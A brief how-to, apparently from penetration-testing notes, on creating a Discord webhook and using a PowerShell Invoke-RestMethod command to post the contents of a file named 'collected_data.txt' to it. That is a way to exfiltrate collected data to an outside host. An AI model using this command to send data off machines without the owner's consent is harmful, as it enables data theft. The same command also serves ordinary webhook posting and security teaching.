# Send Data via Discord

## How To

1. Create a new channel in your own server.
2. Open settings of the channel and click `Integrations` at the left menu.
3. In the Integrations menu, click the `Create Webhook` button.
4. Click the webhook and click the `Copy Webhook URL` to copy the URL.
5. In PowerShell, run the following command:

    ```powershell
    $webhookUrl = "<YOUR_WEBHOOK_URL>"
    $content = Get-Content -Raw -Path ".\collected_data.txt"

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body @{
        "content" = $content
    } -ContentType 'application/x-www-form-urlencoded'
    ```

6. Check the sent data in your channel.